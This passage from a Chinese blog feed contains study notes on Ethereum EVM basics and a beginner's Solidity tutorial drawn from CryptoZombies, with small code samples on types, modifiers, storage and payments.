contract</h2><p>创建合约时，交易的 inputdata 就是 contract bytecode (合约部署字节码，为了将代码部署到以太坊上)，部署的过程大概是：如果存在构造函数，则执行构造函数，然后将 runtime bytecode (合约源码运行的字节码)返回。<br>调用合约时，交易的 inputdata 作为参数输入给 runtime bytecode 进行处理。</p><h2 id="msg-sender-amp-tx-origin"><a href="#msg-sender-amp-tx-origin" class="headerlink" title="msg.sender &amp; tx.origin"></a>msg.sender &amp; tx.origin</h2><p>msg.sender 指的是直接调用该合约的地址。<br>tx.origin 指的是发起这笔交易的地址。</p><h2 id="call-amp-delegatecall"><a href="#call-amp-delegatecall" class="headerlink" title="call &amp; delegatecall"></a>call &amp; delegatecall</h2><p>call：正常调用<br>delegatecall：委托调用，会把被调用的智能合约代码引入到调用者合约中来执行。</p><h2 id="fallback-函数"><a href="#fallback-函数" class="headerlink" title="fallback 函数"></a>fallback 函数</h2><p>在合约调用没有匹配到对应方法时，或者调用没有带任何数据时被自动调用。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://github.com/crytic/evm-opcodes">Ethereum VM (EVM) Opcodes and Instruction Reference</a> crytic 团队整理的 opcode 表格</li><li><a href="https://ethereum.github.io/yellowpaper/paper.pdf">Ethereum Yellow Paper</a></li><li><a href="https://docs.soliditylang.org/en/latest/index.html">Solidity document</a></li><li><a href="https://solidity-cn.readthedocs.io/zh/develop/index.html">Solidity 中文文档</a></li><li><a href="https://www.jianshu.com/p/f98836ced529">以太坊存储类型(memory,storage)及变量存储详解</a> 讲解存储相关内容，参考文章也很好，如下</li><li><a href="https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/">Understanding Ethereum Smart Contract Storage</a> ⬆️ 参考资料</li><li><a href="https://paper.seebug.org/640/">以太坊智能合约 OPCODE 逆向之理论基础篇</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Stack-amp-Memory-amp-Storage&quot;&gt;&lt;a href=&quot;#Stack-amp-Memory-amp-Storage&quot; class=&quot;headerlink&quot; title=&quot;Stack &amp;amp; Memory &amp;amp; Storage&quot;&gt;&lt;/a&gt;Stack &amp;amp; Memory &amp;amp; Storage&lt;/h2&gt;&lt;p&gt;在 EVM 中，栈 (Stack) 用来执行操作，内存 (Memory) 与存储 (Storage) 用来存储变量。&lt;/p&gt;
&lt;p&gt;Stack：以太坊代码在执行时会将数据 push 到栈中，通过各种操作码 (opcode) 来完成不同的指令，opcode 参数从栈顶依次向下取，如果 opcode 有返回参数则将返回参数 push 回栈顶。&lt;/p&gt;
&lt;p&gt;Memory：用来存储临时变量的空间，一般每32字节存储一个变量，比如 mstore(p,v) 意味着 mem[p…(p + 32)) := v，即将 v 存储到 memory 的 p 至 p+32 的位置。&lt;/p&gt;
&lt;p&gt;Storage：用来永久存储变量的空间，智能合约保存的所有数据，private 的变量也可以在 Storage 中查看。&lt;/p&gt;
&lt;p&gt;数据在存储中的保存方式可以参考 &lt;a href=&quot;https://docs.soliditylang.org/en/latest/abi-spec.html#types&quot;&gt;solidity document&lt;/a&gt; /&lt;a href=&quot;https://solidity-cn.readthedocs.io/zh/develop/abi-spec.html#id4&quot;&gt; 中文版&lt;/a&gt;。&lt;br&gt;我一般查看链上存储数据的方式是采用 web3.js 来读取数据。 代码如下&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; web3 = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Web3(Web3.givenProvider || &lt;span class=&quot;string&quot;&gt;&amp;quot;wss://mainnet.infura.io/ws/v3/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;quot;&lt;/span&gt;);&lt;span class=&quot;comment&quot;&gt;// 在 infura 申请的 api&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;javascript&quot;&gt;web3.eth.getStorageAt(&lt;span class=&quot;string&quot;&gt;&amp;quot;0x407d73d8a49eeb85d32cf465507dd71d507100c1&amp;quot;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;).then(&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log);&lt;span class=&quot;comment&quot;&gt;// 函数介绍：https://web3js.readthedocs.io/en/v1.3.0/web3-eth.html#getstorageat&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Web3.js&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;其实只需在 javascript 块中声明 web3 对象，然后在浏览器控制台使用 web3 函数就可以了。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Solidity 入门</title>
    <link href="http://example.com/1970/01/01/Getting-Started-with-Solidity/"/>
    <id>http://example.com/1970/01/01/Getting-Started-with-Solidity/</id>
    <published>1969-12-31T16:00:00.000Z</published>
    <updated>2021-04-19T13:03:27.965Z</updated>
    
    <content type="html"><![CDATA[<ul><li>pragma</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;&#x2F;&#x2F; 声明 Solidity 编译器版本</span><br><span class="line">contract ZombieFactory&#123;&#x2F;&#x2F; 建立一个名为 ZombieFactory 的合约</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>uint</li></ul><blockquote><p>uint 无符号数据类型，指其值不能是负数，对于有符号的整数存在名为 int 的数据类型。Solidity中，uint 实际上是 uint256代名词，一个256位的无符号整数。用法例如：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uint dnaDigits &#x3D; 16;</span><br></pre></td></tr></table></figure><ul><li>结构体、数组</li></ul><span id="more"></span><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 结构体</span><br><span class="line">struct Person&#123;</span><br><span class="line">uint age;</span><br><span class="line">string name;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 数组</span><br><span class="line">uint[2] fixedArray;&#x2F;&#x2F; 静态数组</span><br><span class="line">string[5] stringArray;&#x2F;&#x2F; string 类型的静态数组</span><br><span class="line">uint[] dynamicArray;&#x2F;&#x2F; 动态数组</span><br><span class="line">&#x2F;&#x2F; Person[] people;</span><br><span class="line">Person[] public people;&#x2F;&#x2F; 定义为 public 数组时，Solidity 会自动创建 getter 方法，其它的合约可以从这个数组读取数据（但不能写入数据），所以这在合约中是一个有用的保存公共数据的模式。</span><br><span class="line"></span><br><span class="line">people.push(Person(18,&quot;ontheway&quot;));&#x2F;&#x2F; 新创建一个 Person，并添加进 people 数组中</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>类型转换</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">uint8 a &#x3D; 5;</span><br><span class="line">uint b &#x3D; 6;</span><br><span class="line">&#x2F;&#x2F; 将会抛出错误，因为 a * b 返回 uint, 而不是 uint8:</span><br><span class="line">uint8 c &#x3D; a * b;</span><br><span class="line">&#x2F;&#x2F; 我们需要将 b 转换为 uint8:</span><br><span class="line">uint8 c &#x3D; a * uint8(b);</span><br></pre></td></tr></table></figure><ul><li>Mapping</li></ul><blockquote><p>key value类型</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 对于金融应用程序，将用户的余额保存在一个 uint类型的变量中：</span><br><span class="line">mapping (address &#x3D;&gt; uint) public accountBalance;</span><br><span class="line">&#x2F;&#x2F; 或者可以用来通过userId 存储&#x2F;查找的用户名</span><br><span class="line">mapping (uint &#x3D;&gt; string) userIdToName;</span><br></pre></td></tr></table></figure><ul><li>Address</li></ul><blockquote><p>地址对象。</p></blockquote><ul><li>msg.sender</li></ul><blockquote><p>在 Solidity 中，有一些全局变量可以被所有函数调用。 其中一个就是 msg.sender，它指的是当前调用者（或智能合约）的 address。<br>在 Solidity 中，功能执行始终需要从外部调用者开始。 一个合约只会在区块链上什么也不做，除非有人调用其中的函数。所以 msg.sender总是存在的。<br>使用 msg.sender 很安全，因为它具有以太坊区块链的安全保障 —— 除非窃取与以太坊地址相关联的私钥，否则是没有办法修改其他人的数据的。</p></blockquote><ul><li>函数</li></ul><p>Solidity 定义的函数的属性默认为公共。 这就意味着任何一方 (或其它合约) 都可以调用你合约里的函数。<br>显然，不是什么时候都需要这样，而且这样的合约易于受到攻击。 所以将自己的函数定义为私有是一个好的编程习惯，只有当你需要外部世界调用它时才将它设置为公共。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 习惯上函数里的变量都是以(_)开头 (但不是硬性规定) 以区别全局变量。</span><br><span class="line">function eatHamburgers(String _name,uint _amount)&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 私有函数</span><br><span class="line">&#x2F;&#x2F; 和函数的参数类似，私有函数的名字用(_)起始。</span><br><span class="line">function _addToArray(uint _number) private&#123;</span><br><span class="line">number.push(_number);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>函数修饰符</li></ul><p>修饰符 public、external、private、internal</p><p>public 公开，任何人都可以调用。<br>external 与 public 类似，只不过这些函数只能在合约之外调用 -&gt; 它们不能被合约内的其他函数调用。<br>private 私有，只有合约自己可以调用。<br>internal 和 private 类似，不过，如果某个合约继承自其父合约，这个合约即可以访问父合约中定义的“内部”函数。</p><p>修饰符 view、pure</p><p>view：只能读取数据不能更改数据<br>pure：比view还要严格，无法访问应用里的任何数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">string greeting &#x3D; &quot;What&#39;s up&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; view</span><br><span class="line">function sayHello() public view returns (string) &#123;</span><br><span class="line">  return greeting;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; pure</span><br><span class="line">function _multiply(uint a, uint b) private pure returns (uint) &#123;</span><br><span class="line">  return a * b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修饰符 modifier</p><blockquote><p>函数修饰符看起来跟函数没什么不同，不过关键字 modifier 告诉编译器，这是个 modifier (修饰符)，而不是个 function (函数)。它不能像函数那样被直接调用，只能被添加到函数定义的末尾，用以改变函数的行为。</p></blockquote><p>以经典的 onlyOwner 代码为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * @dev 调用者不是‘主人’，就会抛出异常</span><br><span class="line"> *&#x2F;</span><br><span class="line">modifier onlyOwner() &#123;</span><br><span class="line">  require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">  _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>onlyOwner 函数修饰符使用方式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">contract MyContract is Ownable &#123;</span><br><span class="line">  event LaughManiacally(string laughter);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;注意！ &#96;onlyOwner&#96;上场 :</span><br><span class="line">  function likeABoss() external onlyOwner &#123;</span><br><span class="line">    LaughManiacally(&quot;Muahahahaha&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意 likeABoss 函数上的 onlyOwner 修饰符。 当你调用 likeABoss 时，首先执行 onlyOwner 中的代码， 执行到 onlyOwner 中的 _; 语句时，程序再返回并执行 likeABoss 中的代码。<br>可见，尽管函数修饰符也可以应用到各种场合，但最常见的还是放在函数执行之前添加快速的 require检查。<br>因为给函数添加了修饰符 onlyOwner，使得唯有合约的主人（也就是部署者）才能调用它。<br>另：modifier 允许带参数。</p><p>修饰符 payable</p><p>用于接收 ether 的函数修饰符。样例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">contract OnlineStore &#123;</span><br><span class="line">  function buySomething() external payable &#123;</span><br><span class="line">    &#x2F;&#x2F; 检查以确定0.001以太发送出去来运行函数:</span><br><span class="line">    require(msg.value &#x3D;&#x3D; 0.001 ether);</span><br><span class="line">    &#x2F;&#x2F; 如果为真，一些用来向函数调用者发送数字内容的逻辑</span><br><span class="line">    transferThing(msg.sender);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里，msg.value 是一种可以查看向合约发送了多少以太的方法，另外 ether 是一个內建单元。</p><ul><li>require</li></ul><blockquote><p>require 使得函数在执行过程中，当不满足某些条件时抛出错误，并停止执行：(会 revert 掉本次所有操作)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function sayHiToVitalik(string _name) public returns (string) &#123;</span><br><span class="line">  &#x2F;&#x2F; 比较 _name 是否等于 &quot;Vitalik&quot;. 如果不成立，抛出异常并终止程序</span><br><span class="line">  &#x2F;&#x2F; (敲黑板: Solidity 并不支持原生的字符串比较, 我们只能通过比较两字符串的 keccak256 哈希值来进行判断)</span><br><span class="line">  require(keccak256(_name) &#x3D;&#x3D; keccak256(&quot;Vitalik&quot;));</span><br><span class="line">  &#x2F;&#x2F; 如果返回 true, 运行如下语句</span><br><span class="line">  return &quot;Hi!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>事件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">event log(uint);&#x2F;&#x2F; 声明 log 事件，需要一个 uint 类型的参数</span><br><span class="line"></span><br><span class="line">emit log(1);&#x2F;&#x2F; 触发 log 事件</span><br></pre></td></tr></table></figure><p>主要用于通知、记录日志</p><ul><li>继承</li></ul><blockquote><p>合约之间可继承，使用 is 关键字</p></blockquote><ul><li>import</li></ul><blockquote><p>导入</p></blockquote><ul><li>storage 与 memory 关键字</li></ul><blockquote><p>在 Solidity 中，有两个地方可以存储变量 —— storage 或 memory。<br>Storage 变量是指永久存储在区块链中的变量。 Memory 变量则是临时的，当外部函数对某合约调用完成时，内存型变量即被移除。 你可以把它想象成存储在你电脑的硬盘或是 RAM 中数据的关系。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">contract SandwichFactory &#123;</span><br><span class="line">  struct Sandwich &#123;</span><br><span class="line">    string name;</span><br><span class="line">    string status;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Sandwich[] sandwiches;</span><br><span class="line"></span><br><span class="line">  function eatSandwich(uint _index) public &#123;</span><br><span class="line">    &#x2F;&#x2F; Sandwich mySandwich &#x3D; sandwiches[_index];</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; ^ 看上去很直接，不过 Solidity 将会给出警告</span><br><span class="line">    &#x2F;&#x2F; 告诉你应该明确在这里定义 &#96;storage&#96; 或者 &#96;memory&#96;。</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 所以你应该明确定义 &#96;storage&#96;:</span><br><span class="line">    Sandwich storage mySandwich &#x3D; sandwiches[_index];</span><br><span class="line">    &#x2F;&#x2F; ...这样 &#96;mySandwich&#96; 是指向 &#96;sandwiches[_index]&#96;的指针</span><br><span class="line">    &#x2F;&#x2F; 在存储里，另外...</span><br><span class="line">    mySandwich.status &#x3D; &quot;Eaten!&quot;;</span><br><span class="line">    &#x2F;&#x2F; ...这将永久把 &#96;sandwiches[_index]&#96; 变为区块链上的存储</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 如果你只想要一个副本，可以使用&#96;memory&#96;:</span><br><span class="line">    Sandwich memory anotherSandwich &#x3D; sandwiches[_index + 1];</span><br><span class="line">    &#x2F;&#x2F; ...这样 &#96;anotherSandwich&#96; 就仅仅是一个内存里的副本了</span><br><span class="line">    &#x2F;&#x2F; 另外</span><br><span class="line">    anotherSandwich.status &#x3D; &quot;Eaten!&quot;;</span><br><span class="line">    &#x2F;&#x2F; ...将仅仅修改临时变量，对 &#96;sandwiches[_index + 1]&#96; 没有任何影响</span><br><span class="line">    &#x2F;&#x2F; 不过你可以这样做:</span><br><span class="line">    sandwiches[_index + 1] &#x3D; anotherSandwich;</span><br><span class="line">    &#x2F;&#x2F; ...如果你想把副本的改动保存回区块链存储</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>与其他合约交互</li></ul><blockquote><p>如果我们的合约需要和区块链上的其他的合约会话，则需先定义一个 interface (接口)。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">address NumberInterfaceAddress &#x3D; 0xab38...;</span><br><span class="line">NumberInterface numberContract &#x3D; NumberInterface(NumberInterfaceAddress);</span><br><span class="line">&#x2F;&#x2F; 接下来就可以使用 numberContract 中调用 NumberInterface 中提供的公开 function 了</span><br></pre></td></tr></table></figure><ul><li>省 gas 的招数：结构封装</li></ul><p>通常情况下不会考虑使用 uint 的变种，因为无论如何定义 uint 的大小，Solidity 都会为它保留 256 位的存储空间。</p><p>除非，把 uint 绑定到 struct 中，如果一个 struct 中包含多个 uint，则尽可能的使用较小的 uint，Solidity 会将这些 uint 打包在一起，从而节省空间，并且把同样类型的变量放一起,因为这样 Solidity 可以将存储空间最小化。例如，有两个 struct：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uint c; uint32 a; uint32 b; 和 uint32 a; uint c; uint32 b;</span><br></pre></td></tr></table></figure><p>前者比后者需要的gas更少，因为前者把uint32放一起了。</p><ul><li>时间单位</li></ul><p>变量 now 将返回当前的unix时间戳，Solidity 还包含秒(seconds)，分钟(minutes)，小时(hours)，天(days)，周(weeks) 和 年(years) 等时间单位。它们都会转换成对应的秒数放入 uint 中。</p><ul><li>利用 view 函数节省 gas</li></ul><p>从外部调用一个view函数，是不需要支付一分 gas 的。<br>如果一个 view 函数在另一个函数的内部被调用，而调用函数与 view 函数的不属于同一个合约，也会产生调用成本。这是因为如果主调函数在以太坊创建了一个事务，它仍然需要逐个节点去验证。所以标记为 view 的函数只有在外部调用时才是免费的。</p><ul><li>提现</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contract GetPaid is Ownable &#123;</span><br><span class="line">  function withdraw() external onlyOwner &#123;</span><br><span class="line">    owner.transfer(this.balance);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意我们使用 Ownable 合约中的 owner 和 onlyOwner，假定它已经被引入了。<br>你可以通过 transfer 函数向一个地址发送以太， 然后 this.balance 将返回当前合约存储了多少以太。 所以如果100个用户每人向我们支付1以太， this.balance 将是100以太。<br>你可以通过 transfer 向任何以太坊地址付钱。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://cryptozombies.io/zh/course">cryptozombies</a> solidity 教程</li><li><a href="https://solidity-cn.readthedocs.io/zh/develop/index.html">solidity 中文文档</a> 这个翻译版本并不会同步最新特性，仅供参考</li><li><a href="https://docs.soliditylang.org/en/latest/index.html">solidity document</a> solidity 官方文档</li></ul>]]></content>
    
    
    <summary type="html">&lt;ul&gt;
&lt;li&gt;pragma&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;pragma solidity ^0.4.19;&amp;#x2F;&amp;#x2F; 声明 Solidity 编译器版本&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;contract ZombieFactory&amp;#123;&amp;#x2F;&amp;#x2F; 建立一个名为 ZombieFactory 的合约&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;uint&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;uint 无符号数据类型，指其值不能是负数，对于有符号的整数存在名为 int 的数据类型。Solidity中，uint 实际上是 uint256代名词，一个256位的无符号整数。用法例如：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;uint dnaDigits &amp;#x3D; 16;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;结构体、数组&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    
  </entry>
  
</feed>
